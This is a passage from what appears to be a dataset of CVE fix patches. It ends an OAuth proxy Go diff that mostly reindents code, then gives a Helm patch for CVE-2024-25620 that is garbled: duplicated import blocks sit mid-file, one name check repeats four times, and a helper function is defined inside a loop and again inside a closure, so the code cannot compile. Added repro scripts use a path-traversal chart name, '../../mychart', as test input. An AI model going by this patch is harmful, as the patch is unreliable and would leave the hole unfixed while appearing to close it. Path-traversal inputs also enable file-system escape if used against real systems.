ErrNeedsLogin\n+        }\n+\n+        return session, nil\n }\n \n // addHeadersForProxying adds the appropriate headers the request / response for proxying\n func (p *OAuthProxy) addHeadersForProxying(rw http.ResponseWriter, req *http.Request, session *sessionsapi.SessionState) {\n-\tif p.PassBasicAuth {\n-\t\tif p.PreferEmailToUser && session.Email != \"\" {\n-\t\t\treq.SetBasicAuth(session.Email, p.BasicAuthPassword)\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.Email}\n-\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t} else {\n-\t\t\treq.SetBasicAuth(session.User, p.BasicAuthPassword)\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.User}\n-\t\t\tif session.Email != \"\" {\n-\t\t\t\treq.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n-\t\t\t} else {\n-\t\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t\t}\n-\t\t}\n-\t\tif session.PreferredUsername != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"X-Forwarded-Preferred-Username\")\n-\t\t}\n-\t}\n-\n-\tif p.PassUserHeaders {\n-\t\tif p.PreferEmailToUser && session.Email != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.Email}\n-\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t} else {\n-\t\t\treq.Header[\"X-Forwarded-User\"] = []string{session.User}\n-\t\t\tif session.Email != \"\" {\n-\t\t\t\treq.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n-\t\t\t} else {\n-\t\t\t\treq.Header.Del(\"X-Forwarded-Email\")\n-\t\t\t}\n-\t\t}\n-\n-\t\tif session.PreferredUsername != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"X-Forwarded-Preferred-Username\")\n-\t\t}\n-\t}\n-\n-\tif p.SetXAuthRequest {\n-\t\trw.Header().Set(\"X-Auth-Request-User\", session.User)\n-\t\tif session.Email != \"\" {\n-\t\t\trw.Header().Set(\"X-Auth-Request-Email\", session.Email)\n-\t\t} else {\n-\t\t\trw.Header().Del(\"X-Auth-Request-Email\")\n-\t\t}\n-\t\tif session.PreferredUsername != \"\" {\n-\t\t\trw.Header().Set(\"X-Auth-Request-Preferred-Username\", session.PreferredUsername)\n-\t\t} else {\n-\t\t\trw.Header().Del(\"X-Auth-Request-Preferred-Username\")\n-\t\t}\n-\n-\t\tif p.PassAccessToken {\n-\t\t\tif session.AccessToken != \"\" {\n-\t\t\t\trw.Header().Set(\"X-Auth-Request-Access-Token\", session.AccessToken)\n-\t\t\t} else {\n-\t\t\t\trw.Header().Del(\"X-Auth-Request-Access-Token\")\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif p.PassAccessToken {\n-\t\tif session.AccessToken != \"\" {\n-\t\t\treq.Header[\"X-Forwarded-Access-Token\"] = []string{session.AccessToken}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"X-Forwarded-Access-Token\")\n-\t\t}\n-\t}\n-\n-\tif p.PassAuthorization {\n-\t\tif session.IDToken != \"\" {\n-\t\t\treq.Header[\"Authorization\"] = []string{fmt.Sprintf(\"Bearer %s\", session.IDToken)}\n-\t\t} else {\n-\t\t\treq.Header.Del(\"Authorization\")\n-\t\t}\n-\t}\n-\tif p.SetBasicAuth {\n-\t\tswitch {\n-\t\tcase p.PreferEmailToUser && session.Email != \"\":\n-\t\t\tauthVal := b64.StdEncoding.EncodeToString([]byte(session.Email + \":\" + p.BasicAuthPassword))\n-\t\t\trw.Header().Set(\"Authorization\", \"Basic \"+authVal)\n-\t\tcase session.User != \"\":\n-\t\t\tauthVal := b64.StdEncoding.EncodeToString([]byte(session.User + \":\" + p.BasicAuthPassword))\n-\t\t\trw.Header().Set(\"Authorization\", \"Basic \"+authVal)\n-\t\tdefault:\n-\t\t\trw.Header().Del(\"Authorization\")\n-\t\t}\n-\t}\n-\tif p.SetAuthorization {\n-\t\tif session.IDToken != \"\" {\n-\t\t\trw.Header().Set(\"Authorization\", fmt.Sprintf(\"Bearer %s\", session.IDToken))\n-\t\t} else {\n-\t\t\trw.Header().Del(\"Authorization\")\n-\t\t}\n-\t}\n-\n-\tif session.Email == \"\" {\n-\t\trw.Header().Set(\"GAP-Auth\", session.User)\n-\t} else {\n-\t\trw.Header().Set(\"GAP-Auth\", session.Email)\n-\t}\n+        if p.PassBasicAuth {\n+                if p.PreferEmailToUser && session.Email != \"\" {\n+                        req.SetBasicAuth(session.Email, p.BasicAuthPassword)\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.Email}\n+                        req.Header.Del(\"X-Forwarded-Email\")\n+                } else {\n+                        req.SetBasicAuth(session.User, p.BasicAuthPassword)\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.User}\n+                        if session.Email != \"\" {\n+                                req.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n+                        } else {\n+                                req.Header.Del(\"X-Forwarded-Email\")\n+                        }\n+                }\n+                if session.PreferredUsername != \"\" {\n+                        req.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n+                } else {\n+                        req.Header.Del(\"X-Forwarded-Preferred-Username\")\n+                }\n+        }\n+\n+        if p.PassUserHeaders {\n+                if p.PreferEmailToUser && session.Email != \"\" {\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.Email}\n+                        req.Header.Del(\"X-Forwarded-Email\")\n+                } else {\n+                        req.Header[\"X-Forwarded-User\"] = []string{session.User}\n+                        if session.Email != \"\" {\n+                                req.Header[\"X-Forwarded-Email\"] = []string{session.Email}\n+                        } else {\n+                                req.Header.Del(\"X-Forwarded-Email\")\n+                        }\n+                }\n+\n+                if session.PreferredUsername != \"\" {\n+                        req.Header[\"X-Forwarded-Preferred-Username\"] = []string{session.PreferredUsername}\n+                } else {\n+                        req.Header.Del(\"X-Forwarded-Preferred-Username\")\n+                }\n+        }\n+\n+        if p.SetXAuthRequest {\n+                rw.Header().Set(\"X-Auth-Request-User\", session.User)\n+                if session.Email != \"\" {\n+                        rw.Header().Set(\"X-Auth-Request-Email\", session.Email)\n+                } else {\n+                        rw.Header().Del(\"X-Auth-Request-Email\")\n+                }\n+                if session.PreferredUsername != \"\" {\n+                        rw.Header().Set(\"X-Auth-Request-Preferred-Username\", session.PreferredUsername)\n+                } else {\n+                        rw.Header().Del(\"X-Auth-Request-Preferred-Username\")\n+                }\n+\n+                if p.PassAccessToken {\n+                        if session.AccessToken != \"\" {\n+                                rw.Header().Set(\"X-Auth-Request-Access-Token\", session.AccessToken)\n+                        } else {\n+                                rw.Header().Del(\"X-Auth-Request-Access-Token\")\n+                        }\n+                }\n+        }\n+\n+        if p.PassAccessToken {\n+                if session.AccessToken != \"\" {\n+                        req.Header[\"X-Forwarded-Access-Token\"] = []string{session.AccessToken}\n+                } else {\n+                        req.Header.Del(\"X-Forwarded-Access-Token\")\n+                }\n+        }\n+\n+        if p.PassAuthorization {\n+                if session.IDToken != \"\" {\n+                        req.Header[\"Authorization\"] = []string{fmt.Sprintf(\"Bearer %s\", session.IDToken)}\n+                } else {\n+                        req.Header.Del(\"Authorization\")\n+                }\n+        }\n+        if p.SetBasicAuth {\n+                switch {\n+                case p.PreferEmailToUser && session.Email != \"\":\n+                        authVal := b64.StdEncoding.EncodeToString([]byte(session.Email + \":\" + p.BasicAuthPassword))\n+                        rw.Header().Set(\"Authorization\", \"Basic \"+authVal)\n+                case session.User != \"\":\n+                        authVal := b64.StdEncoding.EncodeToString([]byte(session.User + \":\" + p.BasicAuthPassword))\n+                        rw.Header().Set(\"Authorization\", \"Basic \"+authVal)\n+                default:\n+                        rw.Header().Del(\"Authorization\")\n+                }\n+        }\n+        if p.SetAuthorization {\n+                if session.IDToken != \"\" {\n+                        rw.Header().Set(\"Authorization\", fmt.Sprintf(\"Bearer %s\", session.IDToken))\n+                } else {\n+                        rw.Header().Del(\"Authorization\")\n+                }\n+        }\n+\n+        if session.Email == \"\" {\n+                rw.Header().Set(\"GAP-Auth\", session.User)\n+        } else {\n+                rw.Header().Set(\"GAP-Auth\", session.Email)\n+        }\n }\n \n // CheckBasicAuth checks the requests Authorization header for basic auth\n // credentials and authenticates these against the proxies HtpasswdFile\n func (p *OAuthProxy) CheckBasicAuth(req *http.Request) (*sessionsapi.SessionState, error) {\n-\tif p.HtpasswdFile == nil {\n-\t\treturn nil, nil\n-\t}\n-\tauth := req.Header.Get(\"Authorization\")\n-\tif auth == \"\" {\n-\t\treturn nil, nil\n-\t}\n-\ts := strings.SplitN(auth, \" \", 2)\n-\tif len(s) != 2 || s[0] != \"Basic\" {\n-\t\treturn nil, fmt.Errorf(\"invalid Authorization header %s\", req.Header.Get(\"Authorization\"))\n-\t}\n-\tb, err := b64.StdEncoding.DecodeString(s[1])\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tpair := strings.SplitN(string(b), \":\", 2)\n-\tif len(pair) != 2 {\n-\t\treturn nil, fmt.Errorf(\"invalid format %s\", b)\n-\t}\n-\tif p.HtpasswdFile.Validate(pair[0], pair[1]) {\n-\t\tlogger.PrintAuthf(pair[0], req, logger.AuthSuccess, \"Authenticated via basic auth and HTpasswd File\")\n-\t\treturn &sessionsapi.SessionState{User: pair[0]}, nil\n-\t}\n-\tlogger.PrintAuthf(pair[0], req, logger.AuthFailure, \"Invalid authentication via basic auth: not in Htpasswd File\")\n-\treturn nil, nil\n+        if p.HtpasswdFile == nil {\n+                return nil, nil\n+        }\n+        auth := req.Header.Get(\"Authorization\")\n+        if auth == \"\" {\n+                return nil, nil\n+        }\n+        s := strings.SplitN(auth, \" \", 2)\n+        if len(s) != 2 || s[0] != \"Basic\" {\n+                return nil, fmt.Errorf(\"invalid Authorization header %s\", req.Header.Get(\"Authorization\"))\n+        }\n+        b, err := b64.StdEncoding.DecodeString(s[1])\n+        if err != nil {\n+                return nil, err\n+        }\n+        pair := strings.SplitN(string(b), \":\", 2)\n+        if len(pair) != 2 {\n+                return nil, fmt.Errorf(\"invalid format %s\", b)\n+        }\n+        if p.HtpasswdFile.Validate(pair[0], pair[1]) {\n+                logger.PrintAuthf(pair[0], req, logger.AuthSuccess, \"Authenticated via basic auth and HTpasswd File\")\n+                return &sessionsapi.SessionState{User: pair[0]}, nil\n+        }\n+        logger.PrintAuthf(pair[0], req, logger.AuthFailure, \"Invalid authentication via basic auth: not in Htpasswd File\")\n+        return nil, nil\n }\n \n // isAjax checks if a request is an ajax request\n func isAjax(req *http.Request) bool {\n-\tacceptValues := req.Header.Values(\"Accept\")\n-\tconst ajaxReq = applicationJSON\n-\tfor _, v := range acceptValues {\n-\t\tif v == ajaxReq {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        acceptValues := req.Header.Values(\"Accept\")\n+        const ajaxReq = applicationJSON\n+        for _, v := range acceptValues {\n+                if v == ajaxReq {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // ErrorJSON returns the error code with an application/json mime type\n func (p *OAuthProxy) ErrorJSON(rw http.ResponseWriter, code int) {\n-\trw.Header().Set(\"Content-Type\", applicationJSON)\n-\trw.WriteHeader(code)\n+        rw.Header().Set(\"Content-Type\", applicationJSON)\n+        rw.WriteHeader(code)\n }\n \n // GetJwtSession loads a session based on a JWT token in the authorization header.\n // (see the config options skip-jwt-bearer-tokens and extra-jwt-issuers)\n func (p *OAuthProxy) GetJwtSession(req *http.Request) (*sessionsapi.SessionState, error) {\n-\trawBearerToken, err := p.findBearerToken(req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// If we are using an oidc provider, go ahead and try that provider first with its Verifier\n-\t// and Bearer Token -> Session converter\n-\tif p.mainJwtBearerVerifier != nil {\n-\t\tbearerToken, err := p.mainJwtBearerVerifier.Verify(req.Context(), rawBearerToken)\n-\t\tif err == nil {\n-\t\t\treturn p.provider.CreateSessionStateFromBearerToken(req.Context(), rawBearerToken, bearerToken)\n-\t\t}\n-\t}\n-\n-\t// Otherwise, attempt to verify against the extra JWT issuers and use a more generic\n-\t// Bearer Token -> Session converter\n-\tfor _, verifier := range p.extraJwtBearerVerifiers {\n-\t\tbearerToken, err := verifier.Verify(req.Context(), rawBearerToken)\n-\t\tif err != nil {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\treturn (*providers.ProviderData)(nil).CreateSessionStateFromBearerToken(req.Context(), rawBearerToken, bearerToken)\n-\t}\n-\treturn nil, fmt.Errorf(\"unable to verify jwt token %s\", req.Header.Get(\"Authorization\"))\n+        rawBearerToken, err := p.findBearerToken(req)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // If we are using an oidc provider, go ahead and try that provider first with its Verifier\n+        // and Bearer Token -> Session converter\n+        if p.mainJwtBearerVerifier != nil {\n+                bearerToken, err := p.mainJwtBearerVerifier.Verify(req.Context(), rawBearerToken)\n+                if err == nil {\n+                        return p.provider.CreateSessionStateFromBearerToken(req.Context(), rawBearerToken, bearerToken)\n+                }\n+        }\n+\n+        // Otherwise, attempt to verify against the extra JWT issuers and use a more generic\n+        // Bearer Token -> Session converter\n+        for _, verifier := range p.extraJwtBearerVerifiers {\n+                bearerToken, err := verifier.Verify(req.Context(), rawBearerToken)\n+                if err != nil {\n+                        continue\n+                }\n+\n+                return (*providers.ProviderData)(nil).CreateSessionStateFromBearerToken(req.Context(), rawBearerToken, bearerToken)\n+        }\n+        return nil, fmt.Errorf(\"unable to verify jwt token %s\", req.Header.Get(\"Authorization\"))\n }\n \n // findBearerToken finds a valid JWT token from the Authorization header of a given request.\n func (p *OAuthProxy) findBearerToken(req *http.Request) (string, error) {\n-\tauth := req.Header.Get(\"Authorization\")\n-\ts := strings.SplitN(auth, \" \", 2)\n-\tif len(s) != 2 {\n-\t\treturn \"\", fmt.Errorf(\"invalid authorization header %s\", auth)\n-\t}\n-\tjwtRegex := regexp.MustCompile(`^eyJ[a-zA-Z0-9_-]*\\.eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]+$`)\n-\tvar rawBearerToken string\n-\tif s[0] == \"Bearer\" && jwtRegex.MatchString(s[1]) {\n-\t\trawBearerToken = s[1]\n-\t} else if s[0] == \"Basic\" {\n-\t\t// Check if we have a Bearer token masquerading in Basic\n-\t\tb, err := b64.StdEncoding.DecodeString(s[1])\n-\t\tif err != nil {\n-\t\t\treturn \"\", err\n-\t\t}\n-\t\tpair := strings.SplitN(string(b), \":\", 2)\n-\t\tif len(pair) != 2 {\n-\t\t\treturn \"\", fmt.Errorf(\"invalid format %s\", b)\n-\t\t}\n-\t\tuser, password := pair[0], pair[1]\n-\n-\t\t// check user, user+password, or just password for a token\n-\t\tif jwtRegex.MatchString(user) {\n-\t\t\t// Support blank passwords or magic `x-oauth-basic` passwords - nothing else\n-\t\t\tif password == \"\" || password == \"x-oauth-basic\" {\n-\t\t\t\trawBearerToken = user\n-\t\t\t}\n-\t\t} else if jwtRegex.MatchString(password) {\n-\t\t\t// support passwords and ignore user\n-\t\t\trawBearerToken = password\n-\t\t}\n-\t}\n-\tif rawBearerToken == \"\" {\n-\t\treturn \"\", fmt.Errorf(\"no valid bearer token found in authorization header\")\n-\t}\n-\n-\treturn rawBearerToken, nil\n+        auth := req.Header.Get(\"Authorization\")\n+        s := strings.SplitN(auth, \" \", 2)\n+        if len(s) != 2 {\n+                return \"\", fmt.Errorf(\"invalid authorization header %s\", auth)\n+        }\n+        jwtRegex := regexp.MustCompile(`^eyJ[a-zA-Z0-9_-]*\\.eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]+$`)\n+        var rawBearerToken string\n+        if s[0] == \"Bearer\" && jwtRegex.MatchString(s[1]) {\n+                rawBearerToken = s[1]\n+        } else if s[0] == \"Basic\" {\n+                // Check if we have a Bearer token masquerading in Basic\n+                b, err := b64.StdEncoding.DecodeString(s[1])\n+                if err != nil {\n+                        return \"\", err\n+                }\n+                pair := strings.SplitN(string(b), \":\", 2)\n+                if len(pair) != 2 {\n+                        return \"\", fmt.Errorf(\"invalid format %s\", b)\n+                }\n+                user, password := pair[0], pair[1]\n+\n+                // check user, user+password, or just password for a token\n+                if jwtRegex.MatchString(user) {\n+                        // Support blank passwords or magic `x-oauth-basic` passwords - nothing else\n+                        if password == \"\" || password == \"x-oauth-basic\" {\n+                                rawBearerToken = user\n+                        }\n+                } else if jwtRegex.MatchString(password) {\n+                        // support passwords and ignore user\n+                        rawBearerToken = password\n+                }\n+        }\n+        if rawBearerToken == \"\" {\n+                return \"\", fmt.Errorf(\"no valid bearer token found in authorization header\")\n+        }\n+\n+        return rawBearerToken, nil\n }\n"}
{"cve":"CVE-2024-25620:0708", "fix_patch": "diff --git a/pkg/chart/metadata.go b/pkg/chart/metadata.go\nindex 97bfc2c0c..30033a9ed 100644\n--- a/pkg/chart/metadata.go\n+++ b/pkg/chart/metadata.go\n@@ -16,157 +16,203 @@ limitations under the License.\n package chart\n \n import (\n-\t\"strings\"\n-\t\"unicode\"\n+        \"strings\"\n+        \"unicode\"\n \n-\t\"github.com/Masterminds/semver/v3\"\n+        \"github.com/Masterminds/semver/v3\"\n )\n \n // Maintainer describes a Chart maintainer.\n type Maintainer struct {\n-\t// Name is a user name or organization name\n-\tName string `json:\"name,omitempty\"`\n-\t// Email is an optional email address to contact the named maintainer\n-\tEmail string `json:\"email,omitempty\"`\n-\t// URL is an optional URL to an address for the named maintainer\n-\tURL string `json:\"url,omitempty\"`\n+        // Name is a user name or organization name\n+        Name string `json:\"name,omitempty\"`\n+        // Email is an optional email address to contact the named maintainer\n+        Email string `json:\"email,omitempty\"`\n+        // URL is an optional URL to an address for the named maintainer\n+        URL string `json:\"url,omitempty\"`\n }\n \n // Validate checks valid data and sanitizes string characters.\n func (m *Maintainer) Validate() error {\n-\tif m == nil {\n-\t\treturn ValidationError(\"maintainers must not contain empty or null nodes\")\n-\t}\n-\tm.Name = sanitizeString(m.Name)\n-\tm.Email = sanitizeString(m.Email)\n-\tm.URL = sanitizeString(m.URL)\n-\treturn nil\n+        if m == nil {\n+                return ValidationError(\"maintainers must not contain empty or null nodes\")\n+        }\n+        m.Name = sanitizeString(m.Name)\n+        m.Email = sanitizeString(m.Email)\n+        m.URL = sanitizeString(m.URL)\n+        return nil\n }\n \n // Metadata for a Chart file. This models the structure of a Chart.yaml file.\n type Metadata struct {\n-\t// The name of the chart. Required.\n-\tName string `json:\"name,omitempty\"`\n-\t// The URL to a relevant project page, git repo, or contact person\n-\tHome string `json:\"home,omitempty\"`\n-\t// Source is the URL to the source code of this chart\n-\tSources []string `json:\"sources,omitempty\"`\n-\t// A SemVer 2 conformant version string of the chart. Required.\n-\tVersion string `json:\"version,omitempty\"`\n-\t// A one-sentence description of the chart\n-\tDescription string `json:\"description,omitempty\"`\n-\t// A list of string keywords\n-\tKeywords []string `json:\"keywords,omitempty\"`\n-\t// A list of name and URL/email address combinations for the maintainer(s)\n-\tMaintainers []*Maintainer `json:\"maintainers,omitempty\"`\n-\t// The URL to an icon file.\n-\tIcon string `json:\"icon,omitempty\"`\n-\t// The API Version of this chart. Required.\n-\tAPIVersion string `json:\"apiVersion,omitempty\"`\n-\t// The condition to check to enable chart\n-\tCondition string `json:\"condition,omitempty\"`\n-\t// The tags to check to enable chart\n-\tTags string `json:\"tags,omitempty\"`\n-\t// The version of the application enclosed inside of this chart.\n-\tAppVersion string `json:\"appVersion,omitempty\"`\n-\t// Whether or not this chart is deprecated\n-\tDeprecated bool `json:\"deprecated,omitempty\"`\n-\t// Annotations are additional mappings uninterpreted by Helm,\n-\t// made available for inspection by other applications.\n-\tAnnotations map[string]string `json:\"annotations,omitempty\"`\n-\t// KubeVersion is a SemVer constraint specifying the version of Kubernetes required.\n-\tKubeVersion string `json:\"kubeVersion,omitempty\"`\n-\t// Dependencies are a list of dependencies for a chart.\n-\tDependencies []*Dependency `json:\"dependencies,omitempty\"`\n-\t// Specifies the chart type: application or library\n-\tType string `json:\"type,omitempty\"`\n+        // The name of the chart. Required.\n+        Name string `json:\"name,omitempty\"`\n+        // The URL to a relevant project page, git repo, or contact person\n+        Home string `json:\"home,omitempty\"`\n+        // Source is the URL to the source code of this chart\n+        Sources []string `json:\"sources,omitempty\"`\n+        // A SemVer 2 conformant version string of the chart. Required.\n+        Version string `json:\"version,omitempty\"`\n+        // A one-sentence description of the chart\n+        Description string `json:\"description,omitempty\"`\n+        // A list of string keywords\n+        Keywords []string `json:\"keywords,omitempty\"`\n+        // A list of name and URL/email address combinations for the maintainer(s)\n+        Maintainers []*Maintainer `json:\"maintainers,omitempty\"`\n+        // The URL to an icon file.\n+        Icon string `json:\"icon,omitempty\"`\n+        // The API Version of this chart. Required.\n+        APIVersion string `json:\"apiVersion,omitempty\"`\n+        // The condition to check to enable chart\n+        Condition string `json:\"condition,omitempty\"`\n+        // The tags to check to enable chart\n+        Tags string `json:\"tags,omitempty\"`\n+        // The version of the application enclosed inside of this chart.\n+        AppVersion string `json:\"appVersion,omitempty\"`\n+        // Whether or not this chart is deprecated\n+        Deprecated bool `json:\"deprecated,omitempty\"`\n+        // Annotations are additional mappings uninterpreted by Helm,\n+        // made available for inspection by other applications.\n+        Annotations map[string]string `json:\"annotations,omitempty\"`\n+        // KubeVersion is a SemVer constraint specifying the version of Kubernetes required.\n+        KubeVersion string `json:\"kubeVersion,omitempty\"`\n+        // Dependencies are a list of dependencies for a chart.\n+        Dependencies []*Dependency `json:\"dependencies,omitempty\"`\n+        // Specifies the chart type: application or library\n+        Type string `json:\"type,omitempty\"`\n }\n \n // Validate checks the metadata for known issues and sanitizes string\n // characters.\n+import (\n+\"errors\"\n+\"path/filepath\"\n+\"strings\"\n+)\n+\n+import (\n+\"errors\"\n+\"path/filepath\"\n+\"strings\"\n+)\n+\n func (md *Metadata) Validate() error {\n-\tif md == nil {\n-\t\treturn ValidationError(\"chart.metadata is required\")\n-\t}\n-\n-\tmd.Name = sanitizeString(md.Name)\n-\tmd.Description = sanitizeString(md.Description)\n-\tmd.Home = sanitizeString(md.Home)\n-\tmd.Icon = sanitizeString(md.Icon)\n-\tmd.Condition = sanitizeString(md.Condition)\n-\tmd.Tags = sanitizeString(md.Tags)\n-\tmd.AppVersion = sanitizeString(md.AppVersion)\n-\tmd.KubeVersion = sanitizeString(md.KubeVersion)\n-\tfor i := range md.Sources {\n-\t\tmd.Sources[i] = sanitizeString(md.Sources[i])\n-\t}\n-\tfor i := range md.Keywords {\n-\t\tmd.Keywords[i] = sanitizeString(md.Keywords[i])\n-\t}\n-\n-\tif md.APIVersion == \"\" {\n-\t\treturn ValidationError(\"chart.metadata.apiVersion is required\")\n-\t}\n-\tif md.Name == \"\" {\n-\t\treturn ValidationError(\"chart.metadata.name is required\")\n-\t}\n-\tif md.Version == \"\" {\n-\t\treturn ValidationError(\"chart.metadata.version is required\")\n-\t}\n-\tif !isValidSemver(md.Version) {\n-\t\treturn ValidationErrorf(\"chart.metadata.version %q is invalid\", md.Version)\n-\t}\n-\tif !isValidChartType(md.Type) {\n-\t\treturn ValidationError(\"chart.metadata.type must be application or library\")\n-\t}\n-\n-\tfor _, m := range md.Maintainers {\n-\t\tif err := m.Validate(); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\t// Aliases need to be validated here to make sure that the alias name does\n-\t// not contain any illegal characters.\n-\tdependencies := map[string]*Dependency{}\n-\tfor _, dependency := range md.Dependencies {\n-\t\tif err := dependency.Validate(); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tkey := dependency.Name\n-\t\tif dependency.Alias != \"\" {\n-\t\t\tkey = dependency.Alias\n-\t\t}\n-\t\tif dependencies[key] != nil {\n-\t\t\treturn ValidationErrorf(\"more than one dependency with name or alias %q\", key)\n-\t\t}\n-\t\tdependencies[key] = dependency\n-\t}\n-\treturn nil\n+        if md == nil {\n+                return ValidationError(\"chart.metadata is required\")\n+        }\n+\n+        md.Name = sanitizeString(md.Name)\n+        md.Description = sanitizeString(md.Description)\n+        md.Home = sanitizeString(md.Home)\n+        md.Icon = sanitizeString(md.Icon)\n+        md.Condition = sanitizeString(md.Condition)\n+        md.Tags = sanitizeString(md.Tags)\n+        md.AppVersion = sanitizeString(md.AppVersion)\n+        md.KubeVersion = sanitizeString(md.KubeVersion)\n+        for i := range md.Sources {\n+                md.Sources[i] = sanitizeString(md.Sources[i])\n+        }\n+        for i := range md.Keywords {\n+                md.Keywords[i] = sanitizeString(md.Keywords[i])\n+        }\n+\n+        if md.APIVersion == \"\" {\n+                return ValidationError(\"chart.metadata.apiVersion is required\")\n+        }\n+        if md.Name == \"\" {\n+                return ValidationError(\"chart.metadata.name is required\")\n+        }\n+if err := validateName(md.Name); err != nil {\n+return ValidationErrorf(\"chart.metadata.name %q is invalid: %s\", md.Name, err)\n+}\n+if err := validateName(md.Name); err != nil {\n+return ValidationErrorf(\"chart.metadata.name %q is invalid: %s\", md.Name, err)\n+}\n+if err := validateName(md.Name); err != nil {\n+return ValidationErrorf(\"chart.metadata.name %q is invalid: %s\", md.Name, err)\n+}\n+if err := validateName(md.Name); err != nil {\n+return ValidationErrorf(\"chart.metadata.name %q is invalid: %s\", md.Name, err)\n+}\n+        if md.Version == \"\" {\n+                return ValidationError(\"chart.metadata.version is required\")\n+        }\n+        if !isValidSemver(md.Version) {\n+                return ValidationErrorf(\"chart.metadata.version %q is invalid\", md.Version)\n+        }\n+        if !isValidChartType(md.Type) {\n+                return ValidationError(\"chart.metadata.type must be application or library\")\n+        }\n+\n+        for _, m := range md.Maintainers {\n+                if err := m.Validate(); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Aliases need to be validated here to make sure that the alias name does\n+        // not contain any illegal characters.\n+        dependencies := map[string]*Dependency{}\n+        for _, dependency := range md.Dependencies {\n+                if err := dependency.Validate(); err != nil {\n+                        return err\n+                }\n+                key := dependency.Name\n+                if dependency.Alias != \"\" {\n+                        key = dependency.Alias\n+                }\n+\n+// validateName validates the name of a chart\n+func validateName(name string) error {\n+if strings.Contains(name, \"..\") {\n+return errors.New(\"chart name cannot contain '..'\")\n+}\n+if filepath.IsAbs(name) {\n+return errors.New(\"chart name cannot be an absolute path\")\n+}\n+return nil\n+}\n+                if dependencies[key] != nil {\n+                        return ValidationErrorf(\"more than one dependency with name or alias %q\", key)\n+                }\n+                dependencies[key] = dependency\n+        }\n+        return nil\n }\n \n func isValidChartType(in string) bool {\n-\tswitch in {\n-\tcase \"\", \"application\", \"library\":\n-\t\treturn true\n-\t}\n-\treturn false\n+        switch in {\n+        case \"\", \"application\", \"library\":\n+                return true\n+        }\n+        return false\n }\n \n func isValidSemver(v string) bool {\n-\t_, err := semver.NewVersion(v)\n-\treturn err == nil\n+        _, err := semver.NewVersion(v)\n+        return err == nil\n }\n \n // sanitizeString normalize spaces and removes non-printable characters.\n func sanitizeString(str string) string {\n-\treturn strings.Map(func(r rune) rune {\n-\t\tif unicode.IsSpace(r) {\n-\t\t\treturn ' '\n-\t\t}\n-\t\tif unicode.IsPrint(r) {\n-\t\t\treturn r\n-\t\t}\n-\t\treturn -1\n-\t}, str)\n+        return strings.Map(func(r rune) rune {\n+                if unicode.IsSpace(r) {\n+                        return ' '\n+                }\n+                if unicode.IsPrint(r) {\n+\n+\n+func validateName(name string) error {\n+if strings.Contains(name, \"..\") {\n+return errors.New(\"chart name cannot contain '..'\")\n+}\n+if filepath.IsAbs(name) {\n+return errors.New(\"chart name cannot be an absolute path\")\n+}\n+return nil\n+}\n+                        return r\n+                }\n+                return -1\n+        }, str)\n }\ndiff --git a/repro.go b/repro.go\nnew file mode 100644\nindex 000000000..e9c8ec7da\n--- /dev/null\n+++ b/repro.go\n@@ -0,0 +1,39 @@\n+package main\n+\n+import (\n+\"fmt\"\n+\"log\"\n+\"os\"\n+\n+\"helm.sh/helm/v3/pkg/chart/loader\"\n+)\n+\n+func main() {\n+// Create a temporary directory for the chart\n+chartDir, err := os.MkdirTemp(\"\", \"chart\")\n+if err != nil {\n+log.Fatal(err)\n+}\n+defer os.RemoveAll(chartDir)\n+\n+// Create a Chart.yaml file with a malicious name\n+chartYaml := `\n+apiVersion: v2\n+name: ../../mychart\n+version: 0.1.0\n+`\n+if err := os.WriteFile(chartDir+\"/Chart.yaml\", []byte(chartYaml), 0644); err != nil {\n+log.Fatal(err)\n+}\n+\n+// Load the chart\n+_, err = loader.Load(chartDir)\n+if err != nil {\n+// This is the expected outcome after the fix\n+fmt.Printf(\"Successfully prevented loading the chart: %s\\n\", err)\n+os.Exit(0)\n+}\n+\n+fmt.Println(\"Vulnerability Confirmed: chart was loaded successfully.\")\n+os.Exit(1)\n+}\ndiff --git a/repro.sh b/repro.sh\nnew file mode 100644\nindex 000000000..09af7bb8b\n--- /dev/null\n+++ b/repro.sh\n@@ -0,0 +1,23 @@\n+#!/bin/bash\n+set -e\n+\n+# Create a temporary directory for the chart\n+chartDir=$(mktemp -d -t helm-repro-XXXXXX)\n+\n+# Create a Chart.yaml file with a malicious name\n+cat > ${chartDir}/Chart.yaml <<EOL\n+apiVersion: v2\n+name: ../../mychart\n+version: 0.1.0\n+EOL\n+\n+# Try to load the chart. This should fail after the fix.\n+if go run ./cmd/helm lint ${chartDir}; then\n+  echo \"Vulnerability Confirmed: chart with malicious name was loaded successfully.\"\n+  rm -rf ${chartDir}\n+  exit 1\n+else\n+  echo \"Successfully prevented loading the chart with malicious name.\"\n+  rm -rf ${chartDir}\n+  exit 0\n+fi\ndiff --git a/repro/repro.go b/repro/repro.go\nnew file mode 100644\nindex 000000000..e9c8ec7da\n--- 